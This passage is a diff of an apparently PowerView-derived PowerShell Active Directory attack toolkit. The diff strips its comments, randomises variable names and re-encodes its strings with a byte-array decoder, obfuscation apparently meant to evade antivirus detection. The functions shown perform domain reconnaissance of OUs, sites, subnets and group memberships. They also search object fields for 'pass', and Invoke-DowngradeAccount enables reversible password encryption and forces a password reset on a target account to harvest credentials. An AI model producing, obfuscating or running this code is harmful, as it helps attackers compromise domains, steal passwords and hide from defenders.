-#>
-
     [CmdletBinding()]
     Param (
         [String]
         $SID,
-
         [String]
         $Name,
-
         [String]
         $SamAccountName,
-
         [String]
         $Domain,
-
         [String]
         $DomainController,
-
         [String]
         $Filter,
-
         [Parameter(Mandatory = $True)]
         [String]
         $PropertyName,
-
         $PropertyValue,
-
         [Int]
         $PropertyXorValue,
-
         [Switch]
         $ClearValue,
-
         [ValidateRange(1,10000)] 
         [Int]
         $PageSize = 200
     )
-
-    $GM6i = @{
+    $Z5nzf = @{
         'SID' = $SID
         'Name' = $Name
         'SamAccountName' = $SamAccountName
@@ -3753,488 +1882,196 @@ function Set-ADObject {
         'Filter' = $Filter
         'PageSize' = $PageSize
     }
-    # splat the appropriate arguments to Get-ADObject
-    $NsyC = Get-ADObject -ReturnRaw @GM6i
-    
+    $i8rB = Get-ADObject -ReturnRaw @Z5nzf
     try {
-        # get the modifiable object for this search result
-        $TFDp2u = $NsyC.GetDirectoryEntry()
-        
+        $oRbi1F9 = $i8rB.GetDirectoryEntry()
         if($ClearValue) {
-            Write-Verbose (HandleResult95 @(66,243,106,66,145,75,139,98,76,165,112,166,118,67,142,96,165,69,123,245) @(19,193,18,46,200))
-            $TFDp2u.$PropertyName.clear()
-            $TFDp2u.commitchanges()
+            Write-Verbose (ParseEntry20 @(187,90,240,211,109,178,34,248,221,89,137,15,236,210,114,153,12,223,234,9) @(234,104,136,191,52))
+            $oRbi1F9.$PropertyName.clear()
+            $oRbi1F9.commitchanges()
         }
-
         elseif($PropertyXorValue) {
-            $MQScv = $TFDp2u.$PropertyName[0].GetType().name
-
-            # UAC value references- https://support.microsoft.com/en-us/kb/305144
-            $PropertyValue = $($TFDp2u.$PropertyName) -bxor $PropertyXorValue 
-            $TFDp2u.$PropertyName = $PropertyValue -as $MQScv       
-            $TFDp2u.commitchanges()     
+            $IKYqaI = $oRbi1F9.$PropertyName[0].GetType().name
+            $PropertyValue = $($oRbi1F9.$PropertyName) -bxor $PropertyXorValue 
+            $oRbi1F9.$PropertyName = $PropertyValue -as $IKYqaI       
+            $oRbi1F9.commitchanges()     
         }
-
         else {
-            $TFDp2u.put($PropertyName, $PropertyValue)
-            $TFDp2u.setinfo()
+            $oRbi1F9.put($PropertyName, $PropertyValue)
+            $oRbi1F9.setinfo()
         }
     }
     catch {
-        Write-Warning ((HandleResult95 @(130,214,115,148,239,227,199,94,142,191,134,190,93,170,225,165,212,64,175,250,179,227,0,154,215,136,196,9,136,222,145,179) @(208,142,57,237,141)) + $PropertyName + (HandleResult95 @(72,236,167,191,72,236,175,161,99,236,163,165,72,231,150,244) @(1,164,245,201)) + $PropertyValue + (HandleResult95 @(24,133,248,154,18,184,189,44,48,206,240,134,42,220,186,123,27,189,135,202) @(82,252,186,247,112,139,244,75)) + $($NsyC.Properties.samaccountname) + (HandleResult95 @(143,26,100,118) @(198,94,11,17)) + $_)
+        Write-Warning ((ParseEntry20 @(23,178,244,27,24,118,163,217,1,72,19,218,218,37,22,48,176,199,32,13,38,135,135,21,32,29,160,142,7,41,4,215) @(69,234,190,98,122)) + $PropertyName + (ParseEntry20 @(156,92,212,187,137,203,143,124,228,133,150,239,156,87,229,240) @(213,20,134,205,192,131)) + $PropertyValue + (ParseEntry20 @(28,185,138,84,182,101,137,175,91,230,28,177,146,110,154,102,137,137,4,233) @(86,192,200,57,212)) + $($i8rB.Properties.samaccountname) + (ParseEntry20 @(231,157,150,131) @(174,217,249,228,24)) + $_)
     }
 }
-
-
 function Invoke-DowngradeAccount {
-<#
-    .SYNOPSIS
-
-        Set reversible encryption on a given account and then force the password
-        to be set on next user login. To repair use "-Repair".
-
-    .PARAMETER SamAccountName
-
-        The SamAccountName of the domain object you're querying for. 
-
-    .PARAMETER Name
-
-        The Name of the domain object you're querying for.
-
-    .PARAMETER Domain
-
-        The domain to query for objects, defaults to the current domain.
-
-    .PARAMETER DomainController
-
-        Domain controller to reflect LDAP queries through.
-
-    .PARAMETER Filter
-
-        Additional LDAP filter string for the query.
-
-    .PARAMETER Repair
-
-        Switch. Unset the reversible encryption flag and force password reset flag.
-
-    .EXAMPLE
-
-        PS> Invoke-DowngradeAccount -SamAccountName jason
-
-        Set reversible encryption on the 'jason' account and force the password to be changed.
-
-    .EXAMPLE
-
-        PS> Invoke-DowngradeAccount -SamAccountName jason -Repair
-
-        Unset reversible encryption on the 'jason' account and remove the forced password change.
-#>
-
     [CmdletBinding()]
     Param (
         [Parameter(Position=0,ValueFromPipeline=$True)]
         [String]
         $SamAccountName,
-
         [String]
         $Name,
-
         [String]
         $Domain,
-
         [String]
         $DomainController,
-
         [String]
         $Filter,
-
         [Switch]
         $Repair
     )
-
     process {
-        $GM6i = @{
+        $Z5nzf = @{
             'SamAccountName' = $SamAccountName
             'Name' = $Name
             'Domain' = $Domain
             'DomainController' = $DomainController
             'Filter' = $Filter
         }
-
-        # splat the appropriate arguments to Get-ADObject
-        $VUkw = Get-ADObject @GM6i | select useraccountcontrol | ConvertFrom-UACValue
-
+        $IzZb = Get-ADObject @Z5nzf | select useraccountcontrol | ConvertFrom-UACValue
         if($Repair) {
-
-            if($VUkw.Keys -contains (HandleResult95 @(32,237,20,62,39,212,77,43,36,253,119,63,42,137,115,60,37,254,115,28,39,254,69,63,42,136,103,55,38,253,24,34,32,237,112,71) @(114,184,33,122))) {
-                # if reversible encryption is set, unset it
-                Set-ADObject @GM6i -PropertyName useraccountcontrol -PropertyXorValue 128
+            if($IzZb.Keys -contains (ParseEntry20 @(84,27,52,140,121,106,34,80,158,105,80,11,89,249,126,64,25,71,154,74,83,8,101,141,116,54,8,76,156,105,63,22,83,157,125,59) @(6,78,1,200,44))) {
+                Set-ADObject @Z5nzf -PropertyName useraccountcontrol -PropertyXorValue 128
             }
-
-            # unset the forced password change
-            Set-ADObject @GM6i -PropertyName pwdlastset -PropertyValue -1
+            Set-ADObject @Z5nzf -PropertyName pwdlastset -PropertyValue -1
         }
-
         else {
-
-            if($VUkw.Keys -contains (HandleResult95 @(240,139,176,92,131,16,155,136,222,85,151,28,247,165,223,117,128,19,228,154,220,34,177,6,247,165,216,46) @(162,206,137,19,213,86))) {
-                # if the password is set to never expire, unset
-                Set-ADObject @GM6i -PropertyName useraccountcontrol -PropertyXorValue 65536
+            if($IzZb.Keys -contains (ParseEntry20 @(91,28,170,170,51,79,96,213,178,35,75,19,198,142,51,111,12,214,163,49,92,104,247,181,48,98,8,174) @(9,89,147,229,101))) {
+                Set-ADObject @Z5nzf -PropertyName useraccountcontrol -PropertyXorValue 65536
             }
-
-            if($VUkw.Keys -notcontains (HandleResult95 @(172,4,163,171,95,23,174,185,168,20,192,170,82,74,144,174,169,23,196,137,95,61,166,173,166,97,208,162,94,62,251,176,172,4,199,210) @(254,81,150,239,10,123,194,232))) {
-                # if reversible encryption is not set, set it
-                Set-ADObject @GM6i -PropertyName useraccountcontrol -PropertyXorValue 128
+            if($IzZb.Keys -notcontains (ParseEntry20 @(209,230,241,49,214,223,168,36,213,246,146,48,219,130,150,51,212,245,150,19,214,245,160,48,219,131,130,56,215,246,253,45,209,230,149,72) @(131,179,196,117))) {
+                Set-ADObject @Z5nzf -PropertyName useraccountcontrol -PropertyXorValue 128
             }
-
-            # force the password to be changed on next login
-            Set-ADObject @GM6i -PropertyName pwdlastset -PropertyValue 0
+            Set-ADObject @Z5nzf -PropertyName pwdlastset -PropertyValue 0
         }
     }
 }
-
-
 function Get-ComputerProperty {
-<#
-    .SYNOPSIS
-
-        Returns a list of all computer object properties. If a property
-        name is specified, it returns all [computer:property] values.
-
-        Taken directly from @obscuresec's post:
-            http://obscuresecurity.blogspot.com/2014/04/ADSISearcher.html
-
-    .PARAMETER Properties
-
-        Return property names for computers.
-
-    .PARAMETER Domain
-
-        The domain to query for computer properties, defaults to the current domain.
-
-    .PARAMETER DomainController
-
-        Domain controller to reflect LDAP queries through.
-
-    .PARAMETER PageSize
-
-        The PageSize to set for the LDAP searcher object.
-
-    .EXAMPLE
-
-        PS C:\> Get-ComputerProperty -Domain testing
-        
-        Returns all user properties for computers in the 'testing' domain.
-
-    .EXAMPLE
-
-        PS C:\> Get-ComputerProperty -Properties ssn,lastlogon,location
-        
-        Returns all an array of computer/ssn/lastlogin/location combinations
-        for computers in the current domain.
-
-    .LINK
-
-        http://obscuresecurity.blogspot.com/2014/04/ADSISearcher.html
-#>
-
     [CmdletBinding()]
     param(
         [String[]]
         $Properties,
-
         [String]
         $Domain,
-
         [String]
         $DomainController,
-
         [ValidateRange(1,10000)] 
         [Int]
         $PageSize = 200
     )
-
     if($Properties) {
-        # extract out the set of all properties for each object
-        $Properties = ,(HandleResult95 @(26,91,11,133,34,103,112,204) @(120,54,77,241)) + $Properties | Sort-Object -Unique
+        $Properties = ,(ParseEntry20 @(148,128,13,12,116,167,208,118) @(246,237,75,120,46)) + $Properties | Sort-Object -Unique
         Get-NetComputer -Domain $Domain -DomainController $DomainController -FullData -PageSize $PageSize | Select-Object -Property $Properties
     }
     else {
-        # extract out just the property names
-        Get-NetComputer -Domain $Domain -DomainController $DomainController -FullData -PageSize $PageSize | Select-Object -first 1 | Get-Member -MemberType *Property | Select-Object -Property (HandleResult95 @(29,116,3,90,19,72,120,19) @(73,25,69,46))
+        Get-NetComputer -Domain $Domain -DomainController $DomainController -FullData -PageSize $PageSize | Select-Object -first 1 | Get-Member -MemberType *Property | Select-Object -Property (ParseEntry20 @(71,44,166,242,250,66,46,124) @(19,65,224,134,160,19))
     }
 }
-
-
 function Find-ComputerField {
-<#
-    .SYNOPSIS
-
-        Searches computer object fields for a given word (default *pass*). Default
-        field being searched is 'description'.
-
-        Taken directly from @obscuresec's post:
-            http://obscuresecurity.blogspot.com/2014/04/ADSISearcher.html
-
-    .PARAMETER SearchTerm
-
-        Term to search for, default of "pass".
-
-    .PARAMETER SearchField
-
-        User field to search in, default of "description".
-
-    .PARAMETER ADSpath
-
-        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-        Useful for OU queries.
-
-    .PARAMETER Domain
-
-        Domain to search computer fields for, defaults to the current domain.
-
-    .PARAMETER DomainController
-
-        Domain controller to reflect LDAP queries through.
-
-    .PARAMETER PageSize
-
-        The PageSize to set for the LDAP searcher object.
-
-    .EXAMPLE
-
-        PS C:\> Find-ComputerField -SearchTerm backup -SearchField info
-
-        Find computer accounts with "backup" in the "info" field.
-#>
-
     [CmdletBinding()]
     param(
         [Parameter(Position=0,ValueFromPipeline=$True)]
         [Alias('Term')]
         [String]
         $SearchTerm = 'pass',
-
         [Alias('Field')]
         [String]
         $SearchField = 'description',
-
         [String]
         $ADSpath,
-
         [String]
         $Domain,
-
         [String]
         $DomainController,
-
         [ValidateRange(1,10000)] 
         [Int]
         $PageSize = 200
     )
-
     process {
-        Get-NetComputer -ADSpath $ADSpath -Domain $Domain -DomainController $DomainController -FullData -Filter ("(" + $SearchField + ([char]0x3d+[char]0x2a) + $SearchTerm + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Kik=")))) -PageSize $PageSize | Select-Object samaccountname,$SearchField
+        Get-NetComputer -ADSpath $ADSpath -Domain $Domain -DomainController $DomainController -FullData -Filter ("(" + $SearchField + ([char]0x3d+[char]0x2a) + $SearchTerm + ([char]0x2a+[char]0x29)) -PageSize $PageSize | Select-Object samaccountname,$SearchField
     }
 }
-
-
 function Get-NetOU {
-<#
-    .SYNOPSIS
-
-        Gets a list of all current OUs in a domain.
-
-    .PARAMETER OUName
-
-        The OU name to query for, wildcards accepted.
-
-    .PARAMETER GUID
-
-        Only return OUs with the specified GUID in their gplink property.
-
-    .PARAMETER Domain
-
-        The domain to query for OUs, defaults to the current domain.
-
-    .PARAMETER DomainController
-
-        Domain controller to reflect LDAP queries through.
-
-    .PARAMETER ADSpath
-
-        The LDAP source to search through.
-
-    .PARAMETER FullData
-
-        Switch. Return full OU objects instead of just object names (the default).
-
-    .PARAMETER PageSize
-
-        The PageSize to set for the LDAP searcher object.
-
-    .EXAMPLE
-
-        PS C:\> Get-NetOU
-        
-        Returns the current OUs in the domain.
-
-    .EXAMPLE
-
-        PS C:\> Get-NetOU -OUName *admin* -Domain testlab.local
-        
-        Returns all OUs with "admin" in their name in the testlab.local domain.
-
-     .EXAMPLE
-
-        PS C:\> Get-NetOU -GUID 123-...
-        
-        Returns all OUs with linked to the specified group policy object.    
-#>
-
     [CmdletBinding()]
     Param (
         [Parameter(ValueFromPipeline=$True)]
         [String]
         $OUName = '*',
-
         [String]
         $GUID,
-
         [String]
         $Domain,
-
         [String]
         $DomainController,
-
         [String]
         $ADSpath,
-
         [Switch]
         $FullData,
-
         [ValidateRange(1,10000)] 
         [Int]
         $PageSize = 200
     )
-
     begin {
-        $zNnKc = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
+        $V702K = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
     }
     process {
-        if ($zNnKc) {
+        if ($V702K) {
             if ($GUID) {
-                # if we're filtering for a GUID in .gplink
-                $zNnKc.filter=((HandleResult95 @(61,62,64,32,223,233,250,7,39,78,1,141,138,130,48,77,67,24,217,173,211,24,22,32,45,142,145,222,47,42,44,63,216,182,246,70,28,78,118,200,130,231,14,43,123,34,209,235,251,37,21,108,22,234,234,220,38,44,36,114) @(118,125,25,79,189,219,176)) + $OUName + (HandleResult95 @(131,99,188,155,19,187,156,184,82,185,134,73,183,131,245,13) @(200,48,212,245,112,252,228)) + $GUID + (HandleResult95 @(97,147,172,216) @(42,250,199,168,17,209)))
+                $V702K.filter=((ParseEntry20 @(166,141,189,8,143,252,174,22,183,153,170,87,188,252,162,87,183,153,128,17,142,160,143,94,143,253,174,9,180,153,209,23,136,163,162,87,140,153,221,18,180,153,156,49,143,163,136,87,166,157,140,18,180,153,213,11,189,159,217,90) @(237,206,228,103)) + $OUName + (ParseEntry20 @(36,184,246,24,25,40,147,238,20,23,28,210,213,17,71,82) @(111,235,158,118,122)) + $GUID + (ParseEntry20 @(222,82,3,147) @(149,59,104,227,122,4,111)))
             }
             else {
-                $zNnKc.filter=((HandleResult95 @(233,106,17,81,124,84,208,211,115,31,112,46,55,168,228,25,18,105,122,16,249,204,66,113,92,45,44,244,251,126,125,78,123,11,220,146,72,31,7,107,63,205,218,127,42,83,114,86,209,241,65,61,103,73,87,246,242,120,117,3) @(162,41,72,62,30,102,154)) + $OUName + ([char]0x29+[char]0x29))
+                $V702K.filter=((ParseEntry20 @(88,29,138,23,237,219,178,98,4,132,54,191,184,202,85,110,137,47,235,159,155,125,53,234,26,188,163,150,74,9,230,8,234,132,190,35,63,132,65,250,176,175,107,8,177,21,227,217,179,64,54,166,33,216,216,148,67,15,238,69) @(19,94,211,120,143,233,248)) + $OUName + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KSk="))))
             }
-
-            $zNnKc.FindAll() | Where-Object {$_} | ForEach-Object {
+            $V702K.FindAll() | Where-Object {$_} | ForEach-Object {
                 if ($FullData) {
-                    # convert/process the LDAP fields for each result
                     Convert-LDAPProperty -Properties $_.Properties
                 }
                 else { 
-                    # otherwise just returning the ADS paths of the OUs
                     $_.properties.adspath
                 }
             }
         }
     }
 }
-
-
 function Get-NetSite {
-<#
-    .SYNOPSIS
-
-        Gets a list of all current sites in a domain.
-
-    .PARAMETER SiteName
-
-        Site filter string, wildcards accepted.
-
-    .PARAMETER Domain
-
-        The domain to query for sites, defaults to the current domain.
-
-    .PARAMETER DomainController
-
-        Domain controller to reflect LDAP queries through.
-
-    .PARAMETER ADSpath
-
-        The LDAP source to search through.
-
-    .PARAMETER GUID
-
-        Only return site with the specified GUID in their gplink property.
-
-    .PARAMETER FullData
-
-        Switch. Return full site objects instead of just object names (the default).
-
-    .PARAMETER PageSize
-
-        The PageSize to set for the LDAP searcher object.
-
-    .EXAMPLE
-
-        PS C:\> Get-NetSite -Domain testlab.local -FullData
-        
-        Returns the full data objects for all sites in testlab.local
-#>
-
     [CmdletBinding()]
     Param (
         [Parameter(ValueFromPipeline=$True)]
         [String]
         $SiteName = "*",
-
         [String]
         $Domain,
-
         [String]
         $DomainController,
-
         [String]
         $ADSpath,
-
         [String]
         $GUID,
-
         [Switch]
         $FullData,
-
         [ValidateRange(1,10000)] 
         [Int]
         $PageSize = 200
     )
-
     begin {
-        $EQ1AKfp = Get-DomainSearcher -ADSpath $ADSpath -Domain $Domain -DomainController $DomainController -ADSprefix (HandleResult95 @(110,217,34,173,74,174,166,15,179,78,217,108,205,250,11,208,71,166,38,233,144,82,133,120,240,71,214,162,91,174,122,226,125,251,247,2) @(63,233,22,148,31,156,202)) -PageSize $PageSize
+        $sBrKi8 = Get-DomainSearcher -ADSpath $ADSpath -Domain $Domain -DomainController $DomainController -ADSprefix (ParseEntry20 @(14,88,110,102,147,248,176,123,5,48,23,44,151,250,232,114,14,90,99,42,156,167,176,37,59,48,16,55,162,141,176,61,61,15,103,98) @(95,104,90,95,198,202,220,75)) -PageSize $PageSize
     }
     process {
-        if($EQ1AKfp) {
-
+        if($sBrKi8) {
             if ($GUID) {
-                # if we're filtering for a GUID in .gplink
-                $EQ1AKfp.filter=((HandleResult95 @(24,32,68,113,66,187,247,34,57,74,80,16,216,143,21,83,71,73,68,255,222,61,8,36,125,18,229,141,9,48,118,113,66,228,251,39,57,73,46,29) @(83,99,29,30,32,137,189)) + $SiteName + (HandleResult95 @(160,202,54,1,232,181,3,219,137,244,45,86,192,149,70,150) @(235,153,94,111,139,242,123,171)) + $GUID + (HandleResult95 @(206,34,236,156) @(133,75,135,236,101,126,148)))
+                $sBrKi8.filter=((ParseEntry20 @(221,205,196,248,223,202,75,127,204,217,211,167,236,202,71,62,204,217,249,225,222,150,106,55,245,188,241,167,231,171,106,97,244,227,219,227,231,172,49,51) @(150,142,157,151,189,248,1,14)) + $SiteName + (ParseEntry20 @(52,27,73,181,249,56,48,81,185,247,12,113,106,188,167,66) @(127,72,33,219,154)) + $GUID + (ParseEntry20 @(86,121,102,128) @(29,16,13,240,93,33,137)))
             }
             else {
-                $EQ1AKfp.filter=((HandleResult95 @(221,25,201,21,78,164,16,225,32,123,216,106,193,72,106,166,0,199,30,90,245,52,251,67,79,164,54,160,32,127,253,53,242,23,106,226,0,196,74,17) @(150,90,144,122,44)) + $SiteName + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KSk="))))
+                $sBrKi8.filter=((ParseEntry20 @(192,42,56,131,193,45,46,250,51,54,162,147,78,86,205,89,59,187,199,105,7,229,2,88,143,145,115,84,209,58,10,131,193,114,34,255,51,53,220,158) @(139,105,97,236,163,31,100)) + $SiteName + ([char]0x29+[char]0x29))
             }
-            
             try {
-                $EQ1AKfp.FindAll() | Where-Object {$_} | ForEach-Object {
+                $sBrKi8.FindAll() | Where-Object {$_} | ForEach-Object {
                     if ($FullData) {
-                        # convert/process the LDAP fields for each result
                         Convert-LDAPProperty -Properties $_.Properties
                     }
                     else {
-                        # otherwise just return the site name
                         $_.properties.name
                     }
                 }
@@ -4245,104 +2082,47 @@ function Get-NetSite {
         }
     }
 }
-
-
 function Get-NetSubnet {
-<#
-    .SYNOPSIS
-
-        Gets a list of all current subnets in a domain.
-
-    .PARAMETER SiteName
-
-        Only return subnets from the specified SiteName.
-
-    .PARAMETER Domain
-
-        The domain to query for subnets, defaults to the current domain.
-
-    .PARAMETER DomainController
-
-        Domain controller to reflect LDAP queries through.
-
-    .PARAMETER ADSpath
-
-        The LDAP source to search through.
-
-    .PARAMETER FullData
-
-        Switch. Return full subnet objects instead of just object names (the default).
-
-    .PARAMETER PageSize
-
-        The PageSize to set for the LDAP searcher object.
-
-    .EXAMPLE
-
-        PS C:\> Get-NetSubnet
-        
-        Returns all subnet names in the current domain.
-
-    .EXAMPLE
-
-        PS C:\> Get-NetSubnet -Domain testlab.local -FullData
-        
-        Returns the full data objects for all subnets in testlab.local
-#>
-
     [CmdletBinding()]
     Param (
         [Parameter(ValueFromPipeline=$True)]
         [String]
         $SiteName = "*",
-
         [String]
         $Domain,
-
         [String]
         $ADSpath,
-
         [String]
         $DomainController,
-
         [Switch]
         $FullData,
-
         [ValidateRange(1,10000)] 
         [Int]
         $PageSize = 200
     )
-
     begin {
-        $XbeTSL = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -ADSprefix (HandleResult95 @(244,151,103,100,240,148,5,52,199,202,5,109,198,222,43,25,241,205,98,9,196,255,1,49,198,222,43,25,241,205,98,25,199,149,102,48,196,240,55,108,198,202,21,109,196,240,106,40) @(165,167,83,93)) -PageSize $PageSize
+        $sSLM = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -ADSprefix (ParseEntry20 @(193,89,83,139,92,163,63,14,208,100,198,89,4,203,113,212,61,13,131,93,241,49,53,222,106,233,17,35,230,99,161,45,5,128,60,253,8,48,214,56,243,4,33,130,104,199,80,18) @(144,105,103,178,9)) -PageSize $PageSize
     }
-
     process {
-        if($XbeTSL) {
-
-            $XbeTSL.filter=(HandleResult95 @(144,55,127,193,25,2,43,170,46,113,224,75,97,83,157,68,124,249,31,70,2,181,31,31,205,72,102,8,185,25,112,158,48,99,10,230) @(219,116,38,174,123,48,97))
-
+        if($sSLM) {
+            $sSLM.filter=(ParseEntry20 @(250,69,130,170,10,131,76,170,159,63,255,54,138,247,46,129,92,140,161,30,210,104,176,252,11,130,80,178,167,5,231,54,144,150,3,140) @(177,6,219,197,104))
             try {
-                $XbeTSL.FindAll() | Where-Object {$_} | ForEach-Object {
+                $sSLM.FindAll() | Where-Object {$_} | ForEach-Object {
                     if ($FullData) {
-                        # convert/process the LDAP fields for each result
-                        Convert-LDAPProperty -Properties $_.Properties | Where-Object { $_.siteobject -match ((HandleResult95 @(126,46,146,105) @(47,30,166,80,45,112,87,42)) + $SiteName) }
+                        Convert-LDAPProperty -Properties $_.Properties | Where-Object { $_.siteobject -match ((ParseEntry20 @(31,218,81,236) @(78,234,101,213,151,150)) + $SiteName) }
                     }
                     else {
-                        # otherwise just return the subnet name and site name
-                        if ( ($SiteName -and ($_.properties.siteobject -match ((HandleResult95 @(190,184,74,71) @(239,136,126,126,132)) + $SiteName + ","))) -or ($SiteName -eq '*')) {
-
-                            $yw0wgqW = @{
+                        if ( ($SiteName -and ($_.properties.siteobject -match ((ParseEntry20 @(87,39,199,193) @(6,23,243,248,228)) + $SiteName + ","))) -or ($SiteName -eq '*')) {
+                            $cxFSl = @{
                                 'Subnet' = $_.properties.name[0]
                             }
                             try {
-                                $yw0wgqW['Site'] = ($_.properties.siteobject[0]).split(",")[0]
+                                $cxFSl['Site'] = ($_.properties.siteobject[0]).split(",")[0]
                             }
                             catch {
-                                $yw0wgqW['Site'] = 'Error'
+                                $cxFSl['Site'] = 'Error'
                             }
-
-                            New-Object -TypeName PSObject -Property $yw0wgqW                 
+                            New-Object -TypeName PSObject -Property $cxFSl                 
                         }
                     }
                 }
@@ -4353,189 +2133,72 @@ function Get-NetSubnet {
         }
     }
 }
-
-
 function Get-DomainSID {
-<#
-    .SYNOPSIS
-
-        Gets the SID for the domain.
-
-    .PARAMETER Domain
-
-        The domain to query, defaults to the current domain.
-
-    .EXAMPLE
-
-        C:\> Get-DomainSID -Domain TEST
-        
-        Returns SID for the domain 'TEST'
-#>
-
     param(
         [String]
         $Domain
     )
-
-    $cYF9amo6 = Get-NetDomain -Domain $Domain
-    
-    if($cYF9amo6) {
-        # query for the primary domain controller so we can extract the domain SID for filtering
-        $qfLwzX = $cYF9amo6.PdcRoleOwner
-        $Pt368P = (Get-NetComputer -Domain $Domain -ComputerName $qfLwzX -FullData).objectsid
-        $u5Ie777 = $Pt368P.split("-")
-        $u5Ie777[0..($u5Ie777.length -2)] -join "-"
+    $zImi = Get-NetDomain -Domain $Domain
+    if($zImi) {
+        $beM6n = $zImi.PdcRoleOwner
+        $IB0u7O3M = (Get-NetComputer -Domain $Domain -ComputerName $beM6n -FullData).objectsid
+        $A6w2GNY = $IB0u7O3M.split("-")
+        $A6w2GNY[0..($A6w2GNY.length -2)] -join "-"
     }
 }
-
-
 function Get-NetGroup {
-<#
-    .SYNOPSIS
-
-        Gets a list of all current groups in a domain, or all
-        the groups a given user/group object belongs to.
-
-    .PARAMETER GroupName
-
-        The group name to query for, wildcards accepted.
-
-    .PARAMETER SID
-
-        The group SID to query for.
-
-    .PARAMETER UserName
-
-        The user name (or group name) to query for all effective
-        groups of.
-
-    .PARAMETER Filter
-
-        A customized ldap filter string to use, e.g. "(description=*admin*)"
-
-    .PARAMETER Domain
-
-        The domain to query for groups, defaults to the current domain.
-
-    .PARAMETER DomainController
-
-        Domain controller to reflect LDAP queries through.
-
-    .PARAMETER ADSpath
-
-        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-        Useful for OU queries.
-
-    .PARAMETER AdminCount
-
-        Switch. Return group with adminCount=1.
-
-    .PARAMETER FullData
-
-        Switch. Return full group objects instead of just object names (the default).
-
-    .PARAMETER RawSids
-
-        Switch. Return raw SIDs when using "Get-NetGroup -UserName X"
-
-    .PARAMETER PageSize
-
-        The PageSize to set for the LDAP searcher object.
-
-    .EXAMPLE
-
-        PS C:\> Get-NetGroup
-        
-        Returns the current groups in the domain.
-
-    .EXAMPLE
-
-        PS C:\> Get-NetGroup -GroupName *admin*
-        
-        Returns all groups with "admin" in their group name.
-
-    .EXAMPLE
-
-        PS C:\> Get-NetGroup -Domain testing -FullData
-        
-        Returns full group data objects in the 'testing' domain
-#>
-
     [CmdletBinding()]
     param(
         [Parameter(ValueFromPipeline=$True)]
         [String]
         $GroupName = '*',
-
         [String]
         $SID,
-
         [String]
         $UserName,
-
         [String]
         $Filter,
-
         [String]
         $Domain,
-        
         [String]
         $DomainController,
-        
         [String]
         $ADSpath,
-
         [Switch]
         $AdminCount,
-
         [Switch]
         $FullData,
-
         [Switch]
         $RawSids,
-
         [ValidateRange(1,10000)] 
         [Int]
         $PageSize = 200
     )
-
     begin {
-        $rj90KgZ = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
+        $mPpJqP = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
     }
-
     process {
-        if($rj90KgZ) {
-
+        if($mPpJqP) {
             if($AdminCount) {
-                Write-Verbose (HandleResult95 @(157,40,115,3,220,254,110,107,13,232,175,125,65,2,188,181,83,92,41,238,174,77,119,26,212,254,35,42,13,235,157,35,86,62,184,241) @(204,26,27,111,133))
-                $Filter += (HandleResult95 @(145,40,53,28,200,141,3,6,46,152,227,94,17,25,251,227,34,32,28,151) @(218,111,115,119,170))
+                Write-Verbose (ParseEntry20 @(99,61,189,114,22,103,253,48,80,98,182,121,21,56,176,57,123,72,147,117,45,2,229,53,99,61,236,47,45,59,216,121,127,94,232,35) @(50,15,213,30,79,85,137,64))
+                $Filter += (ParseEntry20 @(86,233,201,18,123,1,132,80,68,156,182,72,123,56,185,28,80,253,228,68) @(29,174,143,121,25,86,232,37))
             }
-
             if ($UserName) {
-                # get the raw user object
-                $m342PSR = Get-ADObject -SamAccountName $UserName -Domain $Domain -DomainController $DomainController -ReturnRaw -PageSize $PageSize
-
-                # convert the user to a directory entry
-                $aBk2rJ = $m342PSR.GetDirectoryEntry()
-
-                # cause the cache to calculate the token groups for the user
-                $aBk2rJ.RefreshCache((HandleResult95 @(75,175,207,68,176,120,221,190,85,135,22,217,149,126,167,18) @(47,232,246,54,234)))
-
-                $aBk2rJ.TokenGroups | Foreach-Object {
-                    # convert the token group sid
-                    $bOhis1 = (New-Object System.Security.Principal.SecurityIdentifier($_,0)).Value
-                    
-                    # ignore the built in users and default domain user group
-                    if(!($bOhis1 -match '^S-1-5-32-545|-513$')) {
+                $qzuM = Get-ADObject -SamAccountName $UserName -Domain $Domain -DomainController $DomainController -ReturnRaw -PageSize $PageSize
+                $QMqr = $qzuM.GetDirectoryEntry()
+                $QMqr.RefreshCache((ParseEntry20 @(112,252,144,248,222,163,223,92,216,196,179,181,151,162,89,134) @(20,187,169,138,132,244,234)))
+                $QMqr.TokenGroups | Foreach-Object {
+                    $PfVgQi = (New-Object System.Security.Principal.SecurityIdentifier($_,0)).Value
+                    if(!($PfVgQi -match '^S-1-5-32-545|-513$')) {
                         if($FullData) {
-                            Get-ADObject -SID $bOhis1 -PageSize $PageSize
+                            Get-ADObject -SID $PfVgQi -PageSize $PageSize
                         }
                         else {
                             if($RawSids) {
-                                $bOhis1
+                                $PfVgQi
                             }
                             else {
-                                Convert-SidToName $bOhis1
+                                Convert-SidToName $PfVgQi
                             }
                         }
                     }
@@ -4543,20 +2206,16 @@ function Get-NetGroup {
             }
             else {
                 if ($SID) {
-                    $rj90KgZ.filter = ((HandleResult95 @(30,198,132,166,18,193,31,244,135,158,62,195,4,183,155,249,42,164,49,243,190,167,27,202,15,182,151,191,20,171,20,245,150,142,73,154,52,232,139,163,20,181,27,207,143,141,64,206) @(85,133,221,201,112,243)) + $SID + ")" + $Filter + ")")
+                    $mPpJqP.filter = ((ParseEntry20 @(36,168,11,214,13,217,24,200,53,188,28,137,62,217,20,137,53,188,54,207,12,133,57,128,53,216,24,207,11,179,19,201,36,172,107,208,14,134,4,211,11,173,28,243,61,175,98,132) @(111,235,82,185)) + $SID + ")" + $Filter + ")")
                 }
                 else {
-                    $rj90KgZ.filter = ((HandleResult95 @(138,226,162,86,163,147,177,72,155,246,181,9,144,147,189,9,155,246,159,79,162,207,144,0,155,146,177,79,165,249,186,73,138,230,206,81,163,246,174,0) @(193,161,251,57)) + $GroupName + ")" + $Filter + ")")
